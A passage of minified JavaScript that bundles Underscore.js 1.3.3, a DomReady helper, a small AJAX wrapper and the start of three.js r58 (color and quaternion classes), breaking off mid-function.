(function(){function ag(b,p,o){if(b===p){return 0!==b||1/b==1/p}if(null==b||null==p){return b===p}b._chain&&(b=b._wrapped);p._chain&&(p=p._wrapped);if(b.isEqual&&at.isFunction(b.isEqual)){return b.isEqual(p)}if(p.isEqual&&at.isFunction(p.isEqual)){return p.isEqual(b)}var m=ao.call(b);if(m!=ao.call(p)){return !1}switch(m){case"[object String]":return b==""+p;case"[object Number]":return b!=+b?p!=+p:0==b?1/b==1/p:b==+p;case"[object Date]":case"[object Boolean]":return +b==+p;case"[object RegExp]":return b.source==p.source&&b.global==p.global&&b.multiline==p.multiline&&b.ignoreCase==p.ignoreCase}if("object"!=typeof b||"object"!=typeof p){return !1}for(var l=o.length;l--;){if(o[l]==b){return !0}}o.push(b);var l=0,k=!0;if("[object Array]"==m){if(l=b.length,k=l==p.length){for(;l--&&(k=l in b==l in p&&ag(b[l],p[l],o));){}}}else{if("constructor" in b!="constructor" in p||b.constructor!=p.constructor){return !1}for(var j in b){if(at.has(b,j)&&(l++,!(k=at.has(p,j)&&ag(b[j],p[j],o)))){break}}if(k){for(j in p){if(at.has(p,j)&&!l--){break}}k=!l}}o.pop();return k}var ad=this,U=ad._,al={},ap=Array.prototype,ak=Object.prototype,ar=ap.slice,R=ap.unshift,ao=ak.toString,h=ak.hasOwnProperty,S=ap.forEach,Q=ap.map,aj=ap.reduce,ai=ap.reduceRight,af=ap.filter,ae=ap.every,ac=ap.some,ah=ap.indexOf,aa=ap.lastIndexOf,ak=Array.isArray,g=Object.keys,ab=Function.prototype.bind,at=function(b){return new an(b)};"undefined"!==typeof exports?("undefined"!==typeof module&&module.exports&&(exports=module.exports=at),exports._=at):ad._=at;at.VERSION="1.3.3";var aq=at.each=at.forEach=function(b,m,l){if(b!=null){if(S&&b.forEach===S){b.forEach(m,l)}else{if(b.length===+b.length){for(var k=0,j=b.length;k<j;k++){if(k in b&&m.call(l,b[k],k,b)===al){break}}}else{for(k in b){if(at.has(b,k)&&m.call(l,b[k],k,b)===al){break}}}}}};at.map=at.collect=function(k,m,j){var l=[];if(k==null){return l}if(Q&&k.map===Q){return k.map(m,j)}aq(k,function(b,p,o){l[l.length]=m.call(j,b,p,o)});if(k.length===+k.length){l.length=k.length}return l};at.reduce=at.foldl=at.inject=function(b,m,l,k){var j=arguments.length>2;b==null&&(b=[]);if(aj&&b.reduce===aj){k&&(m=at.bind(m,k));return j?b.reduce(m,l):b.reduce(m)}aq(b,function(p,o,q){if(j){l=m.call(k,l,p,o,q)}else{l=p;j=true}});if(!j){throw new TypeError("Reduce of empty array with no initial value")}return l};at.reduceRight=at.foldr=function(b,o,m,l){var k=arguments.length>2;b==null&&(b=[]);if(ai&&b.reduceRight===ai){l&&(o=at.bind(o,l));return k?b.reduceRight(o,m):b.reduceRight(o)}var j=at.toArray(b).reverse();l&&!k&&(o=at.bind(o,l));return k?at.reduce(j,o,m,l):at.reduce(j,o)};at.find=at.detect=function(k,m,j){var l;Y(k,function(b,p,o){if(m.call(j,b,p,o)){l=b;return true}});return l};at.filter=at.select=function(k,m,j){var l=[];if(k==null){return l}if(af&&k.filter===af){return k.filter(m,j)}aq(k,function(b,p,o){m.call(j,b,p,o)&&(l[l.length]=b)});return l};at.reject=function(k,m,j){var l=[];if(k==null){return l}aq(k,function(b,p,o){m.call(j,b,p,o)||(l[l.length]=b)});return l};at.every=at.all=function(k,m,j){var l=true;if(k==null){return l}if(ae&&k.every===ae){return k.every(m,j)}aq(k,function(b,p,o){if(!(l=l&&m.call(j,b,p,o))){return al}});return !!l};var Y=at.some=at.any=function(b,l,k){l||(l=at.identity);var j=false;if(b==null){return j}if(ac&&b.some===ac){return b.some(l,k)}aq(b,function(o,m,p){if(j||(j=l.call(k,o,m,p))){return al}});return !!j};at.include=at.contains=function(k,l){var j=false;if(k==null){return j}if(ah&&k.indexOf===ah){return k.indexOf(l)!=-1}return j=Y(k,function(b){return b===l})};at.invoke=function(b,k){var j=ar.call(arguments,2);return at.map(b,function(l){return(at.isFunction(k)?k||l:l[k]).apply(l,j)})};at.pluck=function(b,j){return at.map(b,function(k){return k[j]})};at.max=function(b,l,k){if(!l&&at.isArray(b)&&b[0]===+b[0]){return Math.max.apply(Math,b)}if(!l&&at.isEmpty(b)){return -Infinity}var j={computed:-Infinity};aq(b,function(o,m,p){m=l?l.call(k,o,m,p):o;m>=j.computed&&(j={value:o,computed:m})});return j.value};at.min=function(b,l,k){if(!l&&at.isArray(b)&&b[0]===+b[0]){return Math.min.apply(Math,b)}if(!l&&at.isEmpty(b)){return Infinity}var j={computed:Infinity};aq(b,function(o,m,p){m=l?l.call(k,o,m,p):o;m<j.computed&&(j={value:o,computed:m})});return j.value};at.shuffle=function(k){var j=[],l;aq(k,function(b,m){l=Math.floor(Math.random()*(m+1));j[m]=j[l];j[l]=b});return j};at.sortBy=function(b,l,k){var j=at.isFunction(l)?l:function(m){return m[l]};return at.pluck(at.map(b,function(o,m,p){return{value:o,criteria:j.call(k,o,m,p)}}).sort(function(o,m){var q=o.criteria,p=m.criteria;return q===void 0?1:p===void 0?-1:q<p?-1:q>p?1:0}),"value")};at.groupBy=function(b,l){var k={},j=at.isFunction(l)?l:function(m){return m[l]};aq(b,function(o,m){var p=j(o,m);(k[p]||(k[p]=[])).push(o)});return k};at.sortedIndex=function(b,o,m){m||(m=at.identity);for(var l=0,k=b.length;l<k;){var j=l+k>>1;m(b[j])<m(o)?l=j+1:k=j}return l};at.toArray=function(b){return !b?[]:at.isArray(b)||at.isArguments(b)?ar.call(b):b.toArray&&at.isFunction(b.toArray)?b.toArray():at.values(b)};at.size=function(b){return at.isArray(b)?b.length:at.keys(b).length};at.first=at.head=at.take=function(k,j,l){return j!=null&&!l?ar.call(k,0,j):k[0]};at.initial=function(k,j,l){return ar.call(k,0,k.length-(j==null||l?1:j))};at.last=function(k,j,l){return j!=null&&!l?ar.call(k,Math.max(k.length-j,0)):k[k.length-1]};at.rest=at.tail=function(k,j,l){return ar.call(k,j==null||l?1:j)};at.compact=function(b){return at.filter(b,function(j){return !!j})};at.flatten=function(b,j){return at.reduce(b,function(k,l){if(at.isArray(l)){return k.concat(j?l:at.flatten(l))}k[k.length]=l;return k},[])};at.without=function(b){return at.difference(b,ar.call(arguments,1))};at.uniq=at.unique=function(b,l,k){var k=k?at.map(b,k):b,j=[];b.length<3&&(l=true);at.reduce(k,function(p,o,m){if(l?at.last(p)!==o||!p.length:!at.include(p,o)){p.push(o);j.push(b[m])}return p},[]);return j};at.union=function(){return at.uniq(at.flatten(arguments,true))};at.intersection=at.intersect=function(b){var j=ar.call(arguments,1);return at.filter(at.uniq(b),function(k){return at.every(j,function(l){return at.indexOf(l,k)>=0})})};at.difference=function(b){var j=at.flatten(ar.call(arguments,1),true);return at.filter(b,function(k){return !at.include(j,k)})};at.zip=function(){for(var b=ar.call(arguments),l=at.max(at.pluck(b,"length")),k=Array(l),j=0;j<l;j++){k[j]=at.pluck(b,""+j)}return k};at.indexOf=function(b,l,k){if(b==null){return -1}var j;if(k){k=at.sortedIndex(b,l);return b[k]===l?k:-1}if(ah&&b.indexOf===ah){return b.indexOf(l)}k=0;for(j=b.length;k<j;k++){if(k in b&&b[k]===l){return k}}return -1};at.lastIndexOf=function(k,j){if(k==null){return -1}if(aa&&k.lastIndexOf===aa){return k.lastIndexOf(j)}for(var l=k.length;l--;){if(l in k&&k[l]===j){return l}}return -1};at.range=function(k,j,p){if(arguments.length<=1){j=k||0;k=0}for(var p=arguments[2]||1,o=Math.max(Math.ceil((j-k)/p),0),m=0,l=Array(o);m<o;){l[m++]=k;k=k+p}return l};var W=function(){};at.bind=function(b,l){var k,j;if(b.bind===ab&&ab){return ab.apply(b,ar.call(arguments,1))}if(!at.isFunction(b)){throw new TypeError}j=ar.call(arguments,2);return k=function(){if(!(this instanceof k)){return b.apply(l,j.concat(ar.call(arguments)))}W.prototype=b.prototype;var m=new W,o=b.apply(m,j.concat(ar.call(arguments)));return Object(o)===o?o:m}};at.bindAll=function(b){var j=ar.call(arguments,1);j.length==0&&(j=at.functions(b));aq(j,function(k){b[k]=at.bind(b[k],b)});return b};at.memoize=function(b,k){var j={};k||(k=at.identity);return function(){var l=k.apply(this,arguments);return at.has(j,l)?j[l]:j[l]=b.apply(this,arguments)}};at.delay=function(k,j){var l=ar.call(arguments,2);return setTimeout(function(){return k.apply(null,l)},j)};at.defer=function(b){return at.delay.apply(at,[b,1].concat(ar.call(arguments,1)))};at.throttle=function(s,r){var q,p,o,m,l,k,b=at.debounce(function(){l=m=false},r);return function(){q=this;p=arguments;o||(o=setTimeout(function(){o=null;l&&s.apply(q,p);b()},r));m?l=true:k=s.apply(q,p);b();m=true;return k}};at.debounce=function(k,j,m){var l;return function(){var o=this,b=arguments;m&&!l&&k.apply(o,b);clearTimeout(l);l=setTimeout(function(){l=null;m||k.apply(o,b)},j)}};at.once=function(k){var j=false,l;return function(){if(j){return l}j=true;return l=k.apply(this,arguments)}};at.wrap=function(k,j){return function(){var b=[k].concat(ar.call(arguments,0));return j.apply(this,b)}};at.compose=function(){var b=arguments;return function(){for(var j=arguments,k=b.length-1;k>=0;k--){j=[b[k].apply(this,j)]}return j[0]}};at.after=function(k,j){return k<=0?j():function(){if(--k<1){return j.apply(this,arguments)}}};at.keys=g||function(b){if(b!==Object(b)){throw new TypeError("Invalid object")}var k=[],j;for(j in b){at.has(b,j)&&(k[k.length]=j)}return k};at.values=function(b){return at.map(b,at.identity)};at.functions=at.methods=function(b){var k=[],j;for(j in b){at.isFunction(b[j])&&k.push(j)}return k.sort()};at.extend=function(b){aq(ar.call(arguments,1),function(j){for(var k in j){b[k]=j[k]}});return b};at.pick=function(b){var j={};aq(at.flatten(ar.call(arguments,1)),function(k){k in b&&(j[k]=b[k])});return j};at.defaults=function(b){aq(ar.call(arguments,1),function(j){for(var k in j){b[k]==null&&(b[k]=j[k])}});return b};at.clone=function(b){return !at.isObject(b)?b:at.isArray(b)?b.slice():at.extend({},b)};at.tap=function(k,j){j(k);return k};at.isEqual=function(k,j){return ag(k,j,[])};at.isEmpty=function(b){if(b==null){return true}if(at.isArray(b)||at.isString(b)){return b.length===0}for(var j in b){if(at.has(b,j)){return false}}return true};at.isElement=function(b){return !!(b&&b.nodeType==1)};at.isArray=ak||function(b){return ao.call(b)=="[object Array]"};at.isObject=function(b){return b===Object(b)};at.isArguments=function(b){return ao.call(b)=="[object Arguments]"};at.isArguments(arguments)||(at.isArguments=function(b){return !(!b||!at.has(b,"callee"))});at.isFunction=function(b){return ao.call(b)=="[object Function]"};at.isString=function(b){return ao.call(b)=="[object String]"};at.isNumber=function(b){return ao.call(b)=="[object Number]"};at.isFinite=function(b){return at.isNumber(b)&&isFinite(b)};at.isNaN=function(b){return b!==b};at.isBoolean=function(b){return b===true||b===false||ao.call(b)=="[object Boolean]"};at.isDate=function(b){return ao.call(b)=="[object Date]"};at.isRegExp=function(b){return ao.call(b)=="[object RegExp]"};at.isNull=function(b){return b===null};at.isUndefined=function(b){return b===void 0};at.has=function(k,j){return h.call(k,j)};at.noConflict=function(){ad._=U;return this};at.identity=function(b){return b};at.times=function(k,j,m){for(var l=0;l<k;l++){j.call(m,l)}};at.escape=function(b){return(""+b).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;").replace(/'/g,"&#x27;").replace(/\//g,"&#x2F;")};at.result=function(b,k){if(b==null){return null}var j=b[k];return at.isFunction(j)?j.call(b):j};at.mixin=function(b){aq(at.functions(b),function(j){f(j,at[j]=b[j])})};var e=0;at.uniqueId=function(k){var j=e++;return k?k+j:j};at.templateSettings={evaluate:/<%([\s\S]+?)%>/g,interpolate:/<%=([\s\S]+?)%>/g,escape:/<%-([\s\S]+?)%>/g};var Z=/.^/,am={"\\":"\\","'":"'",r:"\r",n:"\n",t:"\t",u2028:"\u2028",u2029:"\u2029"},X;for(X in am){am[am[X]]=X}var c=/\\|'|\r|\n|\t|\u2028|\u2029/g,a=/\\(\\|'|r|n|t|u2028|u2029)/g,V=function(b){return b.replace(a,function(k,j){return am[j]})};at.template=function(b,l,k){k=at.defaults(k||{},at.templateSettings);b="__p+='"+b.replace(c,function(m){return"\\"+am[m]}).replace(k.escape||Z,function(o,m){return"'+\n_.escape("+V(m)+")+\n'"}).replace(k.interpolate||Z,function(o,m){return"'+\n("+V(m)+")+\n'"}).replace(k.evaluate||Z,function(o,m){return"';\n"+V(m)+"\n;__p+='"})+"';\n";k.variable||(b="with(obj||{}){\n"+b+"}\n");var b="var __p='';var print=function(){__p+=Array.prototype.join.call(arguments, '')};\n"+b+"return __p;\n",j=new Function(k.variable||"obj","_",b);if(l){return j(l,at)}l=function(m){return j.call(this,m,at)};l.source="function("+(k.variable||"obj")+"){\n"+b+"}";return l};at.chain=function(b){return at(b).chain()};var an=function(b){this._wrapped=b};at.prototype=an.prototype;var T=function(b,j){return j?at(b).chain():b},f=function(b,j){an.prototype[b]=function(){var k=ar.call(arguments);R.call(k,this._wrapped);return T(j.apply(at,k),this._chain)}};at.mixin(at);aq("pop,push,reverse,shift,sort,splice,unshift".split(","),function(k){var j=ap[k];an.prototype[k]=function(){var l=this._wrapped;j.apply(l,arguments);var b=l.length;(k=="shift"||k=="splice")&&b===0&&delete l[0];return T(l,this._chain)}});aq(["concat","join","slice"],function(k){var j=ap[k];an.prototype[k]=function(){return T(j.apply(this._wrapped,arguments),this._chain)}});an.prototype.chain=function(){this._chain=true;return this};an.prototype.value=function(){return this._wrapped}}).call(this);(function(){var k=window.DomReady={};var j=navigator.userAgent.toLowerCase();var c={version:(j.match(/.+(?:rv|it|ra|ie)[\/: ]([\d.]+)/)||[])[1],safari:/webkit/.test(j),opera:/opera/.test(j),msie:(/msie/.test(j))&&(!/opera/.test(j)),mozilla:(/mozilla/.test(j))&&(!/(compatible|webkit)/.test(j))};var e=false;var f=false;var h=[];function a(){if(!f){f=true;if(h){for(var l=0;l<h.length;l++){h[l].call(window,[])}h=[]}}}function g(l){var m=window.onload;if(typeof window.onload!="function"){window.onload=l}else{window.onload=function(){if(m){m()}l()}}}function b(){if(e){return}e=true;if(document.addEventListener&&!c.opera){document.addEventListener("DOMContentLoaded",a,false)}if(c.msie&&window==top){(function(){if(f){return}try{document.documentElement.doScroll("left")}catch(m){setTimeout(arguments.callee,0);return}a()})()}if(c.opera){document.addEventListener("DOMContentLoaded",function(){if(f){return}for(var m=0;m<document.styleSheets.length;m++){if(document.styleSheets[m].disabled){setTimeout(arguments.callee,0);return}}a()},false)}if(c.safari){var l;(function(){if(f){return}if(document.readyState!="loaded"&&document.readyState!="complete"){setTimeout(arguments.callee,0);return}if(l===undefined){var m=document.getElementsByTagName("link");for(var o=0;o<m.length;o++){if(m[o].getAttribute("rel")=="stylesheet"){l++}}var p=document.getElementsByTagName("style");l+=p.length}if(document.styleSheets.length!=l){setTimeout(arguments.callee,0);return}a()})()}g(a)}k.ready=function(m,l){b();if(f){m.call(window,[])}else{h.push(function(){return m.call(window,[])})}};b()})();function microAjax(b,a){this.bindFunction=function(f,e){return function(){return f.apply(e,[e])}};this.stateChange=function(e){if(this.request.readyState==4){this.callbackFunction(this.request.responseText)}};this.getRequest=function(){if(window.ActiveXObject){return new ActiveXObject("Microsoft.XMLHTTP")}else{if(window.XMLHttpRequest){return new XMLHttpRequest()}}return false};this.postBody=(arguments[2]||"");this.callbackFunction=a;this.url=b;this.request=this.getRequest();if(this.request){var c=this.request;c.onreadystatechange=this.bindFunction(this.stateChange,this);if(this.postBody!==""){c.open("POST",b,true);c.setRequestHeader("X-Requested-With","XMLHttpRequest");c.setRequestHeader("Content-type","application/x-www-form-urlencoded");c.setRequestHeader("Connection","close")}else{c.open("GET",b,true)}c.send(this.postBody)}}var THREE=THREE||{REVISION:"58"};self.console=self.console||{info:function(){},log:function(){},debug:function(){},warn:function(){},error:function(){}};self.Int32Array=self.Int32Array||Array;self.Float32Array=self.Float32Array||Array;String.prototype.trim=String.prototype.trim||function(){return this.replace(/^\s+|\s+$/g,"")};THREE.extend=function(g,f){if(Object.keys){var e=Object.keys(f);for(var c=0,b=e.length;c<b;c++){var h=e[c];Object.defineProperty(g,h,Object.getOwnPropertyDescriptor(f,h))}}else{var a={}.hasOwnProperty;for(var h in f){if(a.call(f,h)){g[h]=f[h]}}}return g};(function(){var b=0;var c=["ms","moz","webkit","o"];for(var a=0;a<c.length&&!window.requestAnimationFrame;++a){window.requestAnimationFrame=window[c[a]+"RequestAnimationFrame"];window.cancelAnimationFrame=window[c[a]+"CancelAnimationFrame"]||window[c[a]+"CancelRequestAnimationFrame"]}if(window.requestAnimationFrame===undefined){window.requestAnimationFrame=function(h){var e=Date.now(),f=Math.max(0,16-(e-b));var g=window.setTimeout(function(){h(e+f)},f);b=e+f;return g}}window.cancelAnimationFrame=window.cancelAnimationFrame||function(e){window.clearTimeout(e)}}());THREE.CullFaceNone=0;THREE.CullFaceBack=1;THREE.CullFaceFront=2;THREE.CullFaceFrontBack=3;THREE.FrontFaceDirectionCW=0;THREE.FrontFaceDirectionCCW=1;THREE.BasicShadowMap=0;THREE.PCFShadowMap=1;THREE.PCFSoftShadowMap=2;THREE.FrontSide=0;THREE.BackSide=1;THREE.DoubleSide=2;THREE.NoShading=0;THREE.FlatShading=1;THREE.SmoothShading=2;THREE.NoColors=0;THREE.FaceColors=1;THREE.VertexColors=2;THREE.NoBlending=0;THREE.NormalBlending=1;THREE.AdditiveBlending=2;THREE.SubtractiveBlending=3;THREE.MultiplyBlending=4;THREE.CustomBlending=5;THREE.AddEquation=100;THREE.SubtractEquation=101;THREE.ReverseSubtractEquation=102;THREE.ZeroFactor=200;THREE.OneFactor=201;THREE.SrcColorFactor=202;THREE.OneMinusSrcColorFactor=203;THREE.SrcAlphaFactor=204;THREE.OneMinusSrcAlphaFactor=205;THREE.DstAlphaFactor=206;THREE.OneMinusDstAlphaFactor=207;THREE.DstColorFactor=208;THREE.OneMinusDstColorFactor=209;THREE.SrcAlphaSaturateFactor=210;THREE.MultiplyOperation=0;THREE.MixOperation=1;THREE.AddOperation=2;THREE.UVMapping=function(){};THREE.CubeReflectionMapping=function(){};THREE.CubeRefractionMapping=function(){};THREE.SphericalReflectionMapping=function(){};THREE.SphericalRefractionMapping=function(){};THREE.RepeatWrapping=1000;THREE.ClampToEdgeWrapping=1001;THREE.MirroredRepeatWrapping=1002;THREE.NearestFilter=1003;THREE.NearestMipMapNearestFilter=1004;THREE.NearestMipMapLinearFilter=1005;THREE.LinearFilter=1006;THREE.LinearMipMapNearestFilter=1007;THREE.LinearMipMapLinearFilter=1008;THREE.UnsignedByteType=1009;THREE.ByteType=1010;THREE.ShortType=1011;THREE.UnsignedShortType=1012;THREE.IntType=1013;THREE.UnsignedIntType=1014;THREE.FloatType=1015;THREE.UnsignedShort4444Type=1016;THREE.UnsignedShort5551Type=1017;THREE.UnsignedShort565Type=1018;THREE.AlphaFormat=1019;THREE.RGBFormat=1020;THREE.RGBAFormat=1021;THREE.LuminanceFormat=1022;THREE.LuminanceAlphaFormat=1023;THREE.RGB_S3TC_DXT1_Format=2001;THREE.RGBA_S3TC_DXT1_Format=2002;THREE.RGBA_S3TC_DXT3_Format=2003;THREE.RGBA_S3TC_DXT5_Format=2004;THREE.Color=function(a){if(a!==undefined){this.set(a)}return this};THREE.Color.prototype={constructor:THREE.Color,r:1,g:1,b:1,set:function(a){if(a instanceof THREE.Color){this.copy(a)}else{if(typeof a==="number"){this.setHex(a)}else{if(typeof a==="string"){this.setStyle(a)}}}return this},setHex:function(a){a=Math.floor(a);this.r=(a>>16&255)/255;this.g=(a>>8&255)/255;this.b=(a&255)/255;return this},setRGB:function(e,c,a){this.r=e;this.g=c;this.b=a;return this},setHSL:function(e,c,b){if(c===0){this.r=this.g=this.b=b}else{var a=function(k,j,h){if(h<0){h+=1}if(h>1){h-=1}if(h<1/6){return k+(j-k)*6*h}if(h<1/2){return j}if(h<2/3){return k+(j-k)*6*(2/3-h)}return k};var g=b<=0.5?b*(1+c):b+c-(b*c);var f=(2*b)-g;this.r=a(f,g,e+1/3);this.g=a(f,g,e);this.b=a(f,g,e-1/3)}return this},setStyle:function(b){if(/^rgb\((\d+),(\d+),(\d+)\)$/i.test(b)){var a=/^rgb\((\d+),(\d+),(\d+)\)$/i.exec(b);this.r=Math.min(255,parseInt(a[1],10))/255;this.g=Math.min(255,parseInt(a[2],10))/255;this.b=Math.min(255,parseInt(a[3],10))/255;return this}if(/^rgb\((\d+)\%,(\d+)\%,(\d+)\%\)$/i.test(b)){var a=/^rgb\((\d+)\%,(\d+)\%,(\d+)\%\)$/i.exec(b);this.r=Math.min(100,parseInt(a[1],10))/100;this.g=Math.min(100,parseInt(a[2],10))/100;this.b=Math.min(100,parseInt(a[3],10))/100;return this}if(/^\#([0-9a-f]{6})$/i.test(b)){var a=/^\#([0-9a-f]{6})$/i.exec(b);this.setHex(parseInt(a[1],16));return this}if(/^\#([0-9a-f])([0-9a-f])([0-9a-f])$/i.test(b)){var a=/^\#([0-9a-f])([0-9a-f])([0-9a-f])$/i.exec(b);this.setHex(parseInt(a[1]+a[1]+a[2]+a[2]+a[3]+a[3],16));return this}if(/^(\w+)$/i.test(b)){this.setHex(THREE.ColorKeywords[b]);return this}},copy:function(a){this.r=a.r;this.g=a.g;this.b=a.b;return this},copyGammaToLinear:function(a){this.r=a.r*a.r;this.g=a.g*a.g;this.b=a.b*a.b;return this},copyLinearToGamma:function(a){this.r=Math.sqrt(a.r);this.g=Math.sqrt(a.g);this.b=Math.sqrt(a.b);return this},convertGammaToLinear:function(){var e=this.r,c=this.g,a=this.b;this.r=e*e;this.g=c*c;this.b=a*a;return this},convertLinearToGamma:function(){this.r=Math.sqrt(this.r);this.g=Math.sqrt(this.g);this.b=Math.sqrt(this.b);return this},getHex:function(){return(this.r*255)<<16^(this.g*255)<<8^(this.b*255)<<0},getHexString:function(){return("000000"+this.getHex().toString(16)).slice(-6)},getHSL:function(){var a={h:0,s:0,l:0};return function(){var c=this.r,h=this.g,k=this.b;var l=Math.max(c,h,k);var e=Math.min(c,h,k);var j,f;var o=(e+l)/2;if(e===l){j=0;f=0}else{var m=l-e;f=o<=0.5?m/(l+e):m/(2-l-e);switch(l){case c:j=(h-k)/m+(h<k?6:0);break;case h:j=(k-c)/m+2;break;case k:j=(c-h)/m+4;break}j/=6}a.h=j;a.s=f;a.l=o;return a}}(),getStyle:function(){return"rgb("+((this.r*255)|0)+","+((this.g*255)|0)+","+((this.b*255)|0)+")"},offsetHSL:function(e,c,a){var b=this.getHSL();b.h+=e;b.s+=c;b.l+=a;this.setHSL(b.h,b.s,b.l);return this},add:function(a){this.r+=a.r;this.g+=a.g;this.b+=a.b;return this},addColors:function(b,a){this.r=b.r+a.r;this.g=b.g+a.g;this.b=b.b+a.b;return this},addScalar:function(a){this.r+=a;this.g+=a;this.b+=a;return this},multiply:function(a){this.r*=a.r;this.g*=a.g;this.b*=a.b;return this},multiplyScalar:function(a){this.r*=a;this.g*=a;this.b*=a;return this},lerp:function(a,b){this.r+=(a.r-this.r)*b;this.g+=(a.g-this.g)*b;this.b+=(a.b-this.b)*b;return this},equals:function(a){return(a.r===this.r)&&(a.g===this.g)&&(a.b===this.b)},clone:function(){return new THREE.Color().setRGB(this.r,this.g,this.b)}};THREE.ColorKeywords={aliceblue:15792383,antiquewhite:16444375,aqua:65535,aquamarine:8388564,azure:15794175,beige:16119260,bisque:16770244,black:0,blanchedalmond:16772045,blue:255,blueviolet:9055202,brown:10824234,burlywood:14596231,cadetblue:6266528,chartreuse:8388352,chocolate:13789470,coral:16744272,cornflowerblue:6591981,cornsilk:16775388,crimson:14423100,cyan:65535,darkblue:139,darkcyan:35723,darkgoldenrod:12092939,darkgray:11119017,darkgreen:25600,darkgrey:11119017,darkkhaki:12433259,darkmagenta:9109643,darkolivegreen:5597999,darkorange:16747520,darkorchid:10040012,darkred:9109504,darksalmon:15308410,darkseagreen:9419919,darkslateblue:4734347,darkslategray:3100495,darkslategrey:3100495,darkturquoise:52945,darkviolet:9699539,deeppink:16716947,deepskyblue:49151,dimgray:6908265,dimgrey:6908265,dodgerblue:2003199,firebrick:11674146,floralwhite:16775920,forestgreen:2263842,fuchsia:16711935,gainsboro:14474460,ghostwhite:16316671,gold:16766720,goldenrod:14329120,gray:8421504,green:32768,greenyellow:11403055,grey:8421504,honeydew:15794160,hotpink:16738740,indianred:13458524,indigo:4915330,ivory:16777200,khaki:15787660,lavender:15132410,lavenderblush:16773365,lawngreen:8190976,lemonchiffon:16775885,lightblue:11393254,lightcoral:15761536,lightcyan:14745599,lightgoldenrodyellow:16448210,lightgray:13882323,lightgreen:9498256,lightgrey:13882323,lightpink:16758465,lightsalmon:16752762,lightseagreen:2142890,lightskyblue:8900346,lightslategray:7833753,lightslategrey:7833753,lightsteelblue:11584734,lightyellow:16777184,lime:65280,limegreen:3329330,linen:16445670,magenta:16711935,maroon:8388608,mediumaquamarine:6737322,mediumblue:205,mediumorchid:12211667,mediumpurple:9662683,mediumseagreen:3978097,mediumslateblue:8087790,mediumspringgreen:64154,mediumturquoise:4772300,mediumvioletred:13047173,midnightblue:1644912,mintcream:16121850,mistyrose:16770273,moccasin:16770229,navajowhite:16768685,navy:128,oldlace:16643558,olive:8421376,olivedrab:7048739,orange:16753920,orangered:16729344,orchid:14315734,palegoldenrod:15657130,palegreen:10025880,paleturquoise:11529966,palevioletred:14381203,papayawhip:16773077,peachpuff:16767673,peru:13468991,pink:16761035,plum:14524637,powderblue:11591910,purple:8388736,red:16711680,rosybrown:12357519,royalblue:4286945,saddlebrown:9127187,salmon:16416882,sandybrown:16032864,seagreen:3050327,seashell:16774638,sienna:10506797,silver:12632256,skyblue:8900331,slateblue:6970061,slategray:7372944,slategrey:7372944,snow:16775930,springgreen:65407,steelblue:4620980,tan:13808780,teal:32896,thistle:14204888,tomato:16737095,turquoise:4251856,violet:15631086,wheat:16113331,white:16777215,whitesmoke:16119285,yellow:16776960,yellowgreen:10145074};THREE.Quaternion=function(a,e,c,b){this.x=a||0;this.y=e||0;this.z=c||0;this.w=(b!==undefined)?b:1};THREE.Quaternion.prototype={constructor:THREE.Quaternion,set:function(a,e,c,b){this.x=a;this.y=e;this.z=c;this.w=b;return this},copy:function(a){this.x=a.x;this.y=a.y;this.z=a.z;this.w=a.w;return this},setFromEuler:function(c,a){var j=Math.cos(c.x/2);var h=Math.cos(c.y/2);var f=Math.cos(c.z/2);var g=Math.sin(c.x/2);var e=Math.sin(c.y/2);var b=Math.sin(c.z/2);if(a===undefined||a==="XYZ"){this.x=g*h*f+j*e*b;this.y=j*e*f-g*h*b;this.z=j*h*b+g*e*f;this.w=j*h*f-g*e*b}else{if(a==="YXZ"){this.x=g*h*f+j*e*b;this.y=j*e*f-g*h*b;this.z=j*h*b-g*e*f;this.w=j*h*f+g*e*b}else{if(a==="ZXY"){this.x=g*h*f-j*e*b;this.y=j*e*f+g*h*b;this.z=j*h*b+g*e*f;this.w=j*h*f-g*e*b}else{if(a==="ZYX"){this.x=g*h*f-j*e*b;this.y=j*e*f+g*h*b;this.z=j*h*b-g*e*f;this.w=j*h*f+g*e*b}else{if(a==="YZX"){this.x=g*h*f+j*e*b;this.y=j*e*f+g*h*b;this.z=j*h*b-g*e*f;this.w=j*h*f-g*e*b}else{if(a==="XZY"){this.x=g*h*f-j*e*b;this.y=j*e*f-g*h*b;this.z=j*h*b+g*e*f;this.w=j*h*f+g*e*b}}}}}}return this},setFromAxisAngle:function(c,e){var a=e/2,b=Math.sin(a);this.x=c.x*b;this.y=c.y*b;this.z=c.z*b;this.w=Math.cos(a);return this},setFromRotationMatrix:function(f){var e=f.elements,k=e[0],j=e[4],h=e[8],c=e[1],b=e[5],a=e[9],p=e[2],o=e[6],l=e[10],g=k+b+l,q;if(g>0){q=0.5/Math.sqrt(g+1);this.w=0.25/q;this.x=(o-a)*q;this.y=(h-p)*q;this.z=(c-j)*q}else{if(k>b&&k>l){q=2*Math.sqrt(1+k-b-l);this.w=(o-a)/q;this.x=0.25*q;this.y=(j+c)/q;this.z=(h+p)/q}else{if(b>l){q=2*Math.sqrt(1+b-k-l);this.w=(h-p)/q;this.x=(j+c)/q;this.y=0.25*q;this.z=(a+o)/q}else{q=2*Math.sqrt(1+l-k-b);this.w=(c-j)/q;this.x=(h+p)/q;this.y=(a+o)/q;this.z=0.25*q}}}return this},inverse:function(){this.conjugate().normalize();return this},conjugate:function(){this.x*=-1;this.y*=-1;this.z*=-1;return this},lengthSq:function(){return this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w},length:function(){return Math.sqrt(this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w)},normalize:function(){var a=this.length();if(a===0){this.x=0;this.y=0;this.z=0;this.w=1}else{a=1/a;this.x=this.x*a;this.y=this.y*a;this.z=this.z*a;this.w=this.w*a}return this},multiply:function(a,b){if(b!==undefined){console.warn("DEPRECATED: Quaternion's .multiply() now only accepts one argument. Use .multiplyQuaternions( a, b ) instead.");return this.multiplyQuaternions(a,b)}return this.multiplyQuaternions(this,a)},multiplyQuaternions:function(o,m){var k=o.x,j=o.y,h=o.z,l=o.w;var f=m.x,e=m.y,c=m.z,g=m.w;this.x=k*g+l*f+j*c-h*e;this.y=j*g+l*e+h*f-k*c;this.z=h*g+l*c+k*e-j*f;this.w=l*g-k*f-j*e-h*c;return this},multiplyVector3:function(a){console.warn("DEPRECATED: Quaternion's .multiplyVector3() has been removed. Use is now vector.applyQuaternion( quaternion ) instead.");return a.applyQuaternion(this)},slerp:function(c,m){var k=this.x,j=this.y,h=this.z,l=this.w;var 